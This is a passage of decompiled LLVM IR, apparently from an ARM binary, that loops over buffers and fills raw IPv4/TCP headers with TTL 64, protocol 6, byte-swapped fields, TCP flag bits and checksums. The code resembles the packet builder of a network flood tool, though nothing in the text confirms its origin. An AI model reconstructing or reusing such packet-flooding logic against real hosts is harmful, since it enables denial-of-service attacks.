  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b4e8 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b638 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b4e8 ], [ %v0_b70c, %bb82 ], [ %v0_b70c, %dec_label_pc_b638 ]
  %v3_b65c = load i32, i32* %stack_var_-44, align 4
  %v1_b660 = add i32 %v3_b65c, 1
  store i32 %v1_b660, i32* @r3, align 4
  %v1_b664 = load i32, i32* @r6, align 4
  %v9_b664 = icmp eq i32 %v1_b660, %v1_b664
  store i1 %v9_b664, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b660, i32* %stack_var_-44, align 4
  %v5_b66c = icmp slt i32 %v1_b660, %v1_b664
  br i1 %v5_b66c, label %dec_label_pc_b4e8, label %dec_label_pc_b670

dec_label_pc_b670:                                ; preds = %dec_label_pc_b65c
  store i32 %v6_b464, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b920

dec_label_pc_b684:                                ; preds = %dec_label_pc_b4a8
  %v0_b684 = load i32, i32* @sb, align 4
  store i32 %v0_b684, i32* %r0.global-to-local, align 4
  %v1_b688 = call i32 @function_10608(i32 %v0_b684)
  store i32 %v1_b688, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b5a8, %dec_label_pc_b2c4, %dec_label_pc_b684
  %v1_b694 = phi i32 [ %v3_b498, %dec_label_pc_b2c4 ], [ %v1_b688, %dec_label_pc_b684 ], [ 0, %dec_label_pc_b5a8 ]
  store i32 %v27_b2c4, i32* %lr.global-to-local, align 4
  ret i32 %v1_b694

dec_label_pc_b698:                                ; preds = %bb71
  %v1_b698 = add i32 %v4_b54c, 16
  %v2_b698 = inttoptr i32 %v1_b698 to i32*
  %v3_b698 = load i32, i32* %v2_b698, align 4
  store i32 %v3_b698, i32* @r4, align 4
  %v0_b69c = call i32 @function_e7dc()
  store i32 %v0_b69c, i32* %r0.global-to-local, align 4
  %v3_b6a0 = load i32, i32* %stack_var_-44, align 4
  %v5_b6a8 = mul i32 %v3_b6a0, 24
  %v0_b6b0 = load i32, i32* @r4, align 4
  %v1_b6b0 = and i32 %v0_b6b0, 16711680
  store i32 %v1_b6b0, i32* %ip.global-to-local, align 4
  %v3_b6b4 = udiv i32 %v0_b6b0, 16777216
  %v2_b6b8 = add i32 %v5_b6a8, %arg2
  store i32 %v2_b6b8, i32* %r1.global-to-local, align 4
  %v4_b6bc = udiv i32 %v1_b6b0, 256
  %v5_b6bc = or i32 %v4_b6bc, %v3_b6b4
  store i32 %v5_b6bc, i32* %r2.global-to-local, align 4
  %v1_b6c0 = and i32 %v0_b6b0, 65280
  store i32 %v1_b6c0, i32* %r3.global-to-local, align 4
  %v1_b6c4 = add i32 %v2_b6b8, 20
  %v2_b6c4 = inttoptr i32 %v1_b6c4 to i8*
  %v3_b6c4 = load i8, i8* %v2_b6c4, align 1
  %v4_b6c4 = zext i8 %v3_b6c4 to i32
  store i32 %v4_b6c4, i32* %ip.global-to-local, align 4
  %v5_b6cc = call i32 @llvm.bswap.i32(i32 %v0_b6b0)
  %v7_b6d0 = lshr i32 %v0_b69c, %v4_b6c4
  %v8_b6d0 = add i32 %v7_b6d0, %v5_b6cc
  store i32 %v8_b6d0, i32* %r2.global-to-local, align 4
  %v1_b6d4 = and i32 %v8_b6d0, 16711680
  store i32 %v1_b6d4, i32* %r0.global-to-local, align 4
  %v1_b6e0 = and i32 %v8_b6d0, 65280
  store i32 %v1_b6e0, i32* %r1.global-to-local, align 4
  %v5_b6e8 = call i32 @llvm.bswap.i32(i32 %v8_b6d0)
  store i32 %v5_b6e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b554

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b554
  %v0_b6f4 = call i32 @function_e7dc()
  %v1_b6f4 = trunc i32 %v0_b6f4 to i16
  store i32 %v0_b6f4, i32* %r0.global-to-local, align 4
  store i32 %v2_b534, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b578

dec_label_pc_b704:                                ; preds = %dec_label_pc_b620
  %v3_b704 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b704, i32* @r4, align 4
  store i32 %v2_b2e0, i32* %ip.global-to-local, align 4
  %v5_b70c = mul i32 %v3_b704, 16
  %v6_b70c = add i32 %v5_b70c, %v2_b2e0
  %v7_b70c = inttoptr i32 %v6_b70c to i32*
  store i32 %v0_b70c, i32* %v7_b70c, align 4
  %v0_b710 = load i32, i32* @r8, align 4
  %v1_b710 = add i32 %v0_b710, 4
  %v2_b710 = inttoptr i32 %v1_b710 to i32*
  %v3_b710 = load i32, i32* %v2_b710, align 4
  store i32 %v3_b710, i32* %r1.global-to-local, align 4
  %v1_b71c = and i32 %v3_b710, 65280
  store i32 %v1_b71c, i32* %r2.global-to-local, align 4
  store i32 %v2_b2e0, i32* %r0.global-to-local, align 4
  %v0_b72c = load i32, i32* @r4, align 4
  %v3_b72c = mul i32 %v0_b72c, 16
  %v2_b730 = add i32 %v3_b72c, %v2_b2e0
  store i32 %v2_b730, i32* %ip.global-to-local, align 4
  %v5_b734 = call i32 @llvm.bswap.i32(i32 %v3_b710)
  store i32 %v5_b734, i32* %r3.global-to-local, align 4
  %v2_b738 = add i32 %v2_b730, 4
  %v3_b738 = inttoptr i32 %v2_b738 to i32*
  store i32 %v5_b734, i32* %v3_b738, align 4
  %v0_b73c = load i32, i32* @r8, align 4
  %v1_b73c = add i32 %v0_b73c, 8
  %v2_b73c = inttoptr i32 %v1_b73c to i32*
  %v3_b73c = load i32, i32* %v2_b73c, align 4
  store i32 %v3_b73c, i32* %r1.global-to-local, align 4
  %v1_b740 = and i32 %v3_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  store i32 %v6_b464, i32* %r2.global-to-local, align 4
  %v5_b758 = call i32 @llvm.bswap.i32(i32 %v3_b73c)
  store i32 %v5_b758, i32* %r3.global-to-local, align 4
  %v1_b75c = add i32 %v0_b73c, 2
  %v2_b75c = inttoptr i32 %v1_b75c to i16*
  %v3_b75c = load i16, i16* %v2_b75c, align 2
  %v4_b75c = zext i16 %v3_b75c to i32
  store i32 %v4_b75c, i32* %r1.global-to-local, align 4
  store i32 %v1_b760, i32* @r7, align 4
  %v0_b764 = load i32, i32* @lr, align 4
  %v1_b764 = trunc i32 %v0_b764 to i16
  %v2_b764 = load i32, i32* %ip.global-to-local, align 4
  %v3_b764 = add i32 %v2_b764, 14
  %v4_b764 = inttoptr i32 %v3_b764 to i16*
  store i16 %v1_b764, i16* %v4_b764, align 2
  %v0_b768 = load i32, i32* %r1.global-to-local, align 4
  %v1_b768 = trunc i32 %v0_b768 to i16
  %v2_b768 = load i32, i32* %ip.global-to-local, align 4
  %v3_b768 = add i32 %v2_b768, 12
  %v4_b768 = inttoptr i32 %v3_b768 to i16*
  store i16 %v1_b768, i16* %v4_b768, align 2
  %v0_b76c = load i32, i32* %r3.global-to-local, align 4
  %v1_b76c = load i32, i32* %ip.global-to-local, align 4
  %v2_b76c = add i32 %v1_b76c, 8
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  store i32 %v0_b76c, i32* %v3_b76c, align 4
  %v0_b770 = load i32, i32* @r7, align 4
  store i32 %v0_b770, i32* @r0, align 4
  %v0_b774 = call i32 @function_11038()
  store i32 %v0_b774, i32* %r0.global-to-local, align 4
  store i32 %v2_b2f0, i32* %r3.global-to-local, align 4
  %v2_b780 = load i32, i32* @r4, align 4
  %v5_b780 = mul i32 %v2_b780, 4
  %v6_b780 = add i32 %v5_b780, %v2_b2f0
  %v7_b780 = inttoptr i32 %v6_b780 to i32*
  store i32 %v0_b774, i32* %v7_b780, align 4
  %v3_b784 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b784, i32* %r2.global-to-local, align 4
  %v0_b788 = load i32, i32* %r3.global-to-local, align 4
  %v4_b788 = mul i32 %v3_b784, 4
  %v5_b788 = add i32 %v0_b788, %v4_b788
  %v6_b788 = inttoptr i32 %v5_b788 to i32*
  %v7_b788 = load i32, i32* %v6_b788, align 4
  store i32 %v7_b788, i32* @r4, align 4
  %v1_b78c = inttoptr i32 %v7_b788 to i8*
  %v2_b78c = load i8, i8* %v1_b78c, align 1
  %tmp103 = urem i8 %v2_b78c, 16
  %v1_b790 = zext i8 %tmp103 to i32
  %v1_b794 = or i32 %v1_b790, 64
  store i32 %v1_b794, i32* %r3.global-to-local, align 4
  %v1_b798 = trunc i32 %v1_b794 to i8
  store i8 %v1_b798, i8* %v1_b78c, align 1
  %v0_b79c = load i32, i32* @r4, align 4
  %v1_b79c = inttoptr i32 %v0_b79c to i8*
  %v2_b79c = load i8, i8* %v1_b79c, align 1
  %v0_b7a0 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b7a0, 256
  %v1_b7a8 = and i8 %v2_b79c, -16
  %v1_b7ac = or i8 %v1_b7a8, 5
  %v1_b7b0 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b7a0, 256
  %v4_b7b4 = urem i32 %tmp78, 256
  %v5_b7b4 = or i32 %v4_b7b4, %v1_b7b0
  store i32 %v5_b7b4, i32* %r2.global-to-local, align 4
  %v0_b7b8 = load i32, i32* @fp, align 4
  %v1_b7b8 = urem i32 %v0_b7b8, 256
  store i32 %v1_b7b8, i32* %r0.global-to-local, align 4
  store i32 %v1_b370, i32* %ip.global-to-local, align 4
  %v3_b7c0 = udiv i32 %v0_b7b8, 256
  store i32 %v3_b7c0, i32* %r1.global-to-local, align 4
  store i8 %v1_b7ac, i8* %v1_b79c, align 1
  %v0_b7c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7c8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b7c8 = mul i32 %v1_b7c8, 256
  %v5_b7c8 = or i32 %v4_b7c8, %v0_b7c8
  store i32 %v5_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v4_b7cc, i32* %r0.global-to-local, align 4
  %v2_b7d0 = load i32, i32* @r4, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 1
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i8*
  store i8 %v5_b328, i8* %v4_b7d0, align 1
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* @r4, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 4
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = icmp eq i32 %v0_b7d8, 0
  store i1 %v2_b7d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b7dc, i32* %r1.global-to-local, align 4
  %v0_b7e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b7e0 = trunc i32 %v0_b7e0 to i16
  %v2_b7e0 = load i32, i32* @r4, align 4
  %v3_b7e0 = add i32 %v2_b7e0, 2
  %v4_b7e0 = inttoptr i32 %v3_b7e0 to i16*
  store i16 %v1_b7e0, i16* %v4_b7e0, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b7d8, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b704
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b704, %bb79
  %v0_b7ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ec = trunc i32 %v0_b7ec to i8
  %v2_b7ec = load i32, i32* @r4, align 4
  %v3_b7ec = add i32 %v2_b7ec, 8
  %v4_b7ec = inttoptr i32 %v3_b7ec to i8*
  store i8 %v1_b7ec, i8* %v4_b7ec, align 1
  %v0_b7f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7f0 = trunc i32 %v0_b7f0 to i8
  %v2_b7f0 = load i32, i32* @r4, align 4
  %v3_b7f0 = add i32 %v2_b7f0, 9
  %v4_b7f0 = inttoptr i32 %v3_b7f0 to i8*
  store i8 %v1_b7f0, i8* %v4_b7f0, align 1
  %v0_b7f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b7f4, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b7f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b7f4 = trunc i32 %v1_b7f4 to i16
  %v3_b7f4 = load i32, i32* @r4, align 4
  %v4_b7f4 = add i32 %v3_b7f4, 6
  %v5_b7f4 = inttoptr i32 %v4_b7f4 to i16*
  store i16 %v2_b7f4, i16* %v5_b7f4, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20600.75 to i32), i32* %r2.global-to-local, align 4
  %v2_b7fc = load i32, i32* @global_var_20600.75, align 4
  store i32 %v2_b7fc, i32* %r1.global-to-local, align 4
  %v1_b800 = load i32, i32* @r4, align 4
  %v2_b800 = add i32 %v1_b800, 12
  %v3_b800 = inttoptr i32 %v2_b800 to i32*
  store i32 %v2_b7fc, i32* %v3_b800, align 4
  %v3_b804 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b804, i32* %r3.global-to-local, align 4
  store i32 %v2_b2e0, i32* %ip.global-to-local, align 4
  %v4_b80c = mul i32 %v3_b804, 16
  %v5_b80c = add i32 %v4_b80c, %v2_b2e0
  %v6_b80c = inttoptr i32 %v5_b80c to i32*
  %v7_b80c = load i32, i32* %v6_b80c, align 4
  store i32 %v7_b80c, i32* %r2.global-to-local, align 4
  store i32 %v5_b80c, i32* %r3.global-to-local, align 4
  %v1_b818 = load i32, i32* @r4, align 4
  %v2_b818 = add i32 %v1_b818, 16
  %v3_b818 = inttoptr i32 %v2_b818 to i32*
  store i32 %v7_b80c, i32* %v3_b818, align 4
  %v0_b81c = load i32, i32* %r3.global-to-local, align 4
  %v1_b81c = add i32 %v0_b81c, 12
  %v2_b81c = inttoptr i32 %v1_b81c to i16*
  %v3_b81c = load i16, i16* %v2_b81c, align 2
  %v4_b81c = zext i16 %v3_b81c to i32
  store i32 %v4_b81c, i32* %r0.global-to-local, align 4
  %v1_b820 = add i32 %v0_b81c, 8
  %v2_b820 = inttoptr i32 %v1_b820 to i32*
  %v3_b820 = load i32, i32* %v2_b820, align 4
  store i32 %v3_b820, i32* %r1.global-to-local, align 4
  %v2_b824 = load i32, i32* @r4, align 4
  %v3_b824 = add i32 %v2_b824, 20
  %v4_b824 = inttoptr i32 %v3_b824 to i16*
  store i16 %v3_b81c, i16* %v4_b824, align 2
  %v0_b828 = load i32, i32* @r4, align 4
  %v1_b828 = add i32 %v0_b828, 20
  store i32 %v1_b828, i32* @r8, align 4
  %v1_b82c = add i32 %v0_b828, 33
  %v2_b82c = inttoptr i32 %v1_b82c to i8*
  %v3_b82c = load i8, i8* %v2_b82c, align 1
  %v4_b82c = zext i8 %v3_b82c to i32
  store i32 %v4_b82c, i32* %r2.global-to-local, align 4
  %v0_b830 = load i32, i32* %r1.global-to-local, align 4
  %v2_b830 = add i32 %v0_b828, 24
  %v3_b830 = inttoptr i32 %v2_b830 to i32*
  store i32 %v0_b830, i32* %v3_b830, align 4
  %v0_b834 = load i32, i32* %r2.global-to-local, align 4
  %v1_b834 = or i32 %v0_b834, 1
  store i32 %v1_b834, i32* %r2.global-to-local, align 4
  %v0_b838 = load i32, i32* %r3.global-to-local, align 4
  %v1_b838 = add i32 %v0_b838, 4
  %v2_b838 = inttoptr i32 %v1_b838 to i32*
  %v3_b838 = load i32, i32* %v2_b838, align 4
  store i32 %v3_b838, i32* %r1.global-to-local, align 4
  %v1_b83c = add i32 %v0_b838, 14
  %v2_b83c = inttoptr i32 %v1_b83c to i16*
  %v3_b83c = load i16, i16* %v2_b83c, align 2
  %v4_b83c = zext i16 %v3_b83c to i32
  store i32 %v4_b83c, i32* %r3.global-to-local, align 4
  %v1_b840 = trunc i32 %v1_b834 to i8
  %v2_b840 = load i32, i32* @r8, align 4
  %v3_b840 = add i32 %v2_b840, 13
  %v4_b840 = inttoptr i32 %v3_b840 to i8*
  store i8 %v1_b840, i8* %v4_b840, align 1
  %v0_b844 = load i32, i32* %r3.global-to-local, align 4
  %v1_b844 = trunc i32 %v0_b844 to i16
  %v2_b844 = load i32, i32* @r8, align 4
  %v3_b844 = add i32 %v2_b844, 2
  %v4_b844 = inttoptr i32 %v3_b844 to i16*
  store i16 %v1_b844, i16* %v4_b844, align 2
  %v0_b848 = load i32, i32* @r8, align 4
  %v1_b848 = add i32 %v0_b848, 12
  %v2_b848 = inttoptr i32 %v1_b848 to i8*
  %v3_b848 = load i8, i8* %v2_b848, align 1
  %v4_b848 = zext i8 %v3_b848 to i32
  store i32 %v4_b848, i32* %r3.global-to-local, align 4
  %v1_b84c = add i32 %v0_b848, 13
  %v2_b84c = inttoptr i32 %v1_b84c to i8*
  %v3_b84c = load i8, i8* %v2_b84c, align 1
  %v4_b84c = zext i8 %v3_b84c to i32
  %tmp104 = urem i8 %v3_b848, 16
  %v1_b850 = zext i8 %tmp104 to i32
  %v1_b854 = or i32 %v1_b850, 128
  store i32 %v1_b854, i32* %r3.global-to-local, align 4
  %v1_b858 = or i32 %v4_b84c, 16
  store i32 %v1_b858, i32* %r2.global-to-local, align 4
  %v0_b85c = load i32, i32* %r1.global-to-local, align 4
  %v2_b85c = add i32 %v0_b848, 8
  %v3_b85c = inttoptr i32 %v2_b85c to i32*
  store i32 %v0_b85c, i32* %v3_b85c, align 4
  %v0_b860 = load i32, i32* %r3.global-to-local, align 4
  %v1_b860 = trunc i32 %v0_b860 to i8
  %v2_b860 = load i32, i32* @r8, align 4
  %v3_b860 = add i32 %v2_b860, 12
  %v4_b860 = inttoptr i32 %v3_b860 to i8*
  store i8 %v1_b860, i8* %v4_b860, align 1
  %v0_b864 = load i32, i32* %r2.global-to-local, align 4
  %v1_b864 = trunc i32 %v0_b864 to i8
  %v2_b864 = load i32, i32* @r8, align 4
  %v3_b864 = add i32 %v2_b864, 13
  %v4_b864 = inttoptr i32 %v3_b864 to i8*
  store i8 %v1_b864, i8* %v4_b864, align 1
  %v0_b868 = call i32 @function_e7dc()
  %v1_b868 = trunc i32 %v0_b868 to i16
  store i32 %v0_b868, i32* %r0.global-to-local, align 4
  store i32 %v1_b3ac, i32* %r1.global-to-local, align 4
  %v0_b870 = load i32, i32* @r8, align 4
  %v1_b870 = add i32 %v0_b870, 13
  %v2_b870 = inttoptr i32 %v1_b870 to i8*
  %v3_b870 = load i8, i8* %v2_b870, align 1
  %v4_b870 = zext i8 %v3_b870 to i32
  store i32 %v1_b874, i32* %r2.global-to-local, align 4
  %v1_b878 = and i32 %v4_b870, 223
  %v5_b87c = or i32 %v1_b878, %v4_b87c
  store i32 %v5_b87c, i32* %r3.global-to-local, align 4
  %v1_b880 = trunc i32 %v5_b87c to i8
  store i8 %v1_b880, i8* %v2_b870, align 1
  store i32 %v1_b3cc, i32* %ip.global-to-local, align 4
  %v0_b888 = load i32, i32* @r8, align 4
  %v1_b888 = add i32 %v0_b888, 13
  %v2_b888 = inttoptr i32 %v1_b888 to i8*
  %v3_b888 = load i8, i8* %v2_b888, align 1
  %v4_b888 = zext i8 %v3_b888 to i32
  store i32 %v1_b88c, i32* %r3.global-to-local, align 4
  %v1_b890 = and i32 %v4_b888, 239
  %v5_b894 = or i32 %v1_b890, %v4_b894
  store i32 %v5_b894, i32* %r2.global-to-local, align 4
  %v1_b898 = trunc i32 %v5_b894 to i8
  store i8 %v1_b898, i8* %v2_b888, align 1
  store i32 %v1_b3ec, i32* %r1.global-to-local, align 4
  %v0_b8a0 = load i32, i32* @r8, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 13
  %v2_b8a0 = inttoptr i32 %v1_b8a0 to i8*
  %v3_b8a0 = load i8, i8* %v2_b8a0, align 1
  %v4_b8a0 = zext i8 %v3_b8a0 to i32
  store i32 %v1_b8a4, i32* %r2.global-to-local, align 4
  %v1_b8a8 = and i32 %v4_b8a0, 247
  %v5_b8ac = or i32 %v1_b8a8, %v4_b8ac
  store i32 %v5_b8ac, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v5_b8ac to i8
  store i8 %v1_b8b0, i8* %v2_b8a0, align 1
  store i32 %v1_b40c, i32* %ip.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r8, align 4
  %v1_b8b8 = add i32 %v0_b8b8, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  store i32 %v1_b8bc, i32* %r3.global-to-local, align 4
  %v1_b8c0 = and i32 %v4_b8b8, 251
  %v5_b8c4 = or i32 %v1_b8c0, %v4_b8c4
  store i32 %v5_b8c4, i32* %r2.global-to-local, align 4
  %v1_b8c8 = trunc i32 %v5_b8c4 to i8
  store i8 %v1_b8c8, i8* %v2_b8b8, align 1
  store i32 %v1_b42c, i32* %r1.global-to-local, align 4
  %v0_b8d0 = load i32, i32* @r8, align 4
  %v1_b8d0 = add i32 %v0_b8d0, 13
  %v2_b8d0 = inttoptr i32 %v1_b8d0 to i8*
  %v3_b8d0 = load i8, i8* %v2_b8d0, align 1
  %v4_b8d0 = zext i8 %v3_b8d0 to i32
  store i32 %v1_b8d4, i32* %r2.global-to-local, align 4
  %v1_b8d8 = and i32 %v4_b8d0, 253
  %v4_b8dc = or i32 %v1_b8d8, %v3_b8dc
  store i32 %v4_b8dc, i32* %r3.global-to-local, align 4
  %v1_b8e0 = trunc i32 %v4_b8dc to i8
  store i8 %v1_b8e0, i8* %v2_b8d0, align 1
  store i32 %v1_b44c, i32* %ip.global-to-local, align 4
  %v0_b8e8 = load i32, i32* @r8, align 4
  %v1_b8e8 = add i32 %v0_b8e8, 13
  %v2_b8e8 = inttoptr i32 %v1_b8e8 to i8*
  %v3_b8e8 = load i8, i8* %v2_b8e8, align 1
  %v4_b8e8 = zext i8 %v3_b8e8 to i32
  %v1_b8f0 = and i32 %v4_b8e8, 254
  store i32 %v1_b8f0, i32* %r2.global-to-local, align 4
  %v2_b8f4 = or i32 %v1_b8f0, %v1_b8ec
  store i32 %v2_b8f4, i32* %r3.global-to-local, align 4
  %v1_b8f8 = trunc i32 %v2_b8f4 to i8
  store i8 %v1_b8f8, i8* %v2_b8e8, align 1
  %v3_b8fc = load i32, i32* @r8, align 4
  %v4_b8fc = add i32 %v3_b8fc, 14
  %v5_b8fc = inttoptr i32 %v4_b8fc to i16*
  store i16 %v1_b868, i16* %v5_b8fc, align 2
  store i32 %v6_b464, i32* %r1.global-to-local, align 4
  %v0_b904 = load i32, i32* @r4, align 4
  %v1_b904 = add i32 %v0_b904, 40
  store i32 %v1_b904, i32* %r0.global-to-local, align 4
  %v2_b908 = inttoptr i32 %v1_b904 to i16*
  %v3_b908 = call i32 @function_e9dc(i16* %v2_b908, i32 %v6_b464)
  store i32 %v3_b908, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b65c

dec_label_pc_b910:                                ; preds = %dec_label_pc_b4d0
  store i32 %v6_b464, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b464, 40
  br label %dec_label_pc_b920

dec_label_pc_b920:                                ; preds = %dec_label_pc_b670, %dec_label_pc_b910
  %storemerge6.pre-phi = phi i32 [ %v1_b760, %dec_label_pc_b670 ], [ %.pre, %dec_label_pc_b910 ]
  %v0_b93426 = phi i32 [ %v1_b664, %dec_label_pc_b670 ], [ 0, %dec_label_pc_b910 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b464, 65536
  %storemerge = add i32 %v6_b464, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b920 = add i32 %storemerge4, 1310720
  store i32 %v1_b920, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b920, 256
  %v3_b928 = and i32 %tmp83, 65280
  store i32 %v3_b928, i32* %r3.global-to-local, align 4
  %v4_b92c = udiv i32 %v1_b920, 16777216
  %v5_b92c = or i32 %v3_b928, %v4_b92c
  store i32 %v5_b92c, i32* @r8, align 4
  %v2_ba58 = icmp eq i32 %v1_b484, 0
  br label %dec_label_pc_b930

dec_label_pc_b930:                                ; preds = %dec_label_pc_b930, %dec_label_pc_ba3c, %dec_label_pc_b920
  %v0_b934 = phi i32 [ %v0_b93426, %dec_label_pc_b920 ], [ 0, %dec_label_pc_ba3c ], [ 0, %dec_label_pc_b930 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b934 = icmp eq i32 %v0_b934, 0
  store i1 %v2_b934, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b934, label %dec_label_pc_b930, label %dec_label_pc_b940

dec_label_pc_b940:                                ; preds = %dec_label_pc_b930, %dec_label_pc_ba3c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b944

dec_label_pc_b944:                                ; preds = %dec_label_pc_b96c, %dec_label_pc_b940
  %v1_b94c = phi i32 [ %v1_ba2c, %dec_label_pc_b96c ], [ 0, %dec_label_pc_b940 ]
  store i32 %v2_b2f0, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b94c = mul i32 %v1_b94c, 4
  %v5_b94c = add i32 %v4_b94c, %v2_b2f0
  %v6_b94c = inttoptr i32 %v5_b94c to i32*
  %v7_b94c = load i32, i32* %v6_b94c, align 4
  store i32 %v7_b94c, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b954 = load i32, i32* @fp, align 4
  %v9_b954 = icmp eq i32 %v0_b954, 65535
  store i1 %v9_b954, i1* %cpsr_z.global-to-local, align 1
  %v1_b958 = add i32 %v7_b94c, 20
  store i32 %v1_b958, i32* @r5, align 4
  br i1 %v9_b954, label %dec_label_pc_ba50, label %dec_label_pc_b960

dec_label_pc_b960:                                ; preds = %dec_label_pc_b944
  store i32 %v1_b484, i32* %r3.global-to-local, align 4
  store i1 %v2_ba58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ba58, label %dec_label_pc_b96c, label %dec_label_pc_ba64

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b960, %dec_label_pc_ba50, %dec_label_pc_ba64
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b970 = load i32, i32* @r4, align 4
  %v3_b970 = add i32 %v2_b970, 10
  %v4_b970 = inttoptr i32 %v3_b970 to i16*
  store i16 0, i16* %v4_b970, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b978 = load i32, i32* @r4, align 4
  store i32 %v0_b978, i32* @r0, align 4
  %v2_b97c = call i32 @function_cef4(i32 %v0_b978, i32 20)
  %v3_b97c = trunc i32 %v2_b97c to i16
  store i32 %v2_b97c, i32* %r0.global-to-local, align 4
  %v3_b980 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b2e0, i32* %r2.global-to-local, align 4
  %v3_b988 = mul i32 %v3_b980, 16
  %v2_b98c = add i32 %v3_b988, %v2_b2e0
  store i32 %v2_b98c, i32* %r1.global-to-local, align 4
  %v1_b990 = add i32 %v2_b98c, 4
  %v2_b990 = inttoptr i32 %v1_b990 to i32*
  %v3_b990 = load i32, i32* %v2_b990, align 4
  %v3_b994 = mul i32 %v3_b990, 65536
  store i32 %v3_b994, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b990, 256
  %v1_b99c = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b990, 256
  %v4_b9a0 = urem i32 %tmp86, 256
  %v5_b9a0 = or i32 %v4_b9a0, %v1_b99c
  store i32 %v5_b9a0, i32* %r3.global-to-local, align 4
  %v1_b9a4 = add i32 %v3_b990, 1
  store i32 %v1_b9a4, i32* %r2.global-to-local, align 4
  store i32 %v1_b9a4, i32* %v2_b990, align 4
  %v0_b9ac = load i32, i32* %r3.global-to-local, align 4
  %v1_b9ac = load i32, i32* @r5, align 4
  %v2_b9ac = add i32 %v1_b9ac, 4
  %v3_b9ac = inttoptr i32 %v2_b9ac to i32*
  store i32 %v0_b9ac, i32* %v3_b9ac, align 4
  %v0_b9b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9b0 = add i32 %v0_b9b0, 8
  %v2_b9b0 = inttoptr i32 %v1_b9b0 to i32*
  %v3_b9b0 = load i32, i32* %v2_b9b0, align 4
  %tmp87 = mul i32 %v3_b9b0, 256
  %v1_b9bc = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b9b0, 256
  %v4_b9c0 = urem i32 %tmp88, 256
  %v5_b9c0 = or i32 %v4_b9c0, %v1_b9bc
  %v1_b9c4 = load i32, i32* @r5, align 4
  %v2_b9c4 = add i32 %v1_b9c4, 8
  %v3_b9c4 = inttoptr i32 %v2_b9c4 to i32*
  store i32 %v5_b9c0, i32* %v3_b9c4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b9cc = load i32, i32* @r4, align 4
  %v4_b9cc = add i32 %v3_b9cc, 10
  %v5_b9cc = inttoptr i32 %v4_b9cc to i16*
  store i16 %v3_b97c, i16* %v5_b9cc, align 2
  %v0_b9d0 = load i32, i32* @r5, align 4
  store i32 %v0_b9d0, i32* @r1, align 4
  %v0_b9d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d4 = trunc i32 %v0_b9d4 to i16
  %v3_b9d4 = add i32 %v0_b9d0, 16
  %v4_b9d4 = inttoptr i32 %v3_b9d4 to i16*
  store i16 %v1_b9d4, i16* %v4_b9d4, align 2
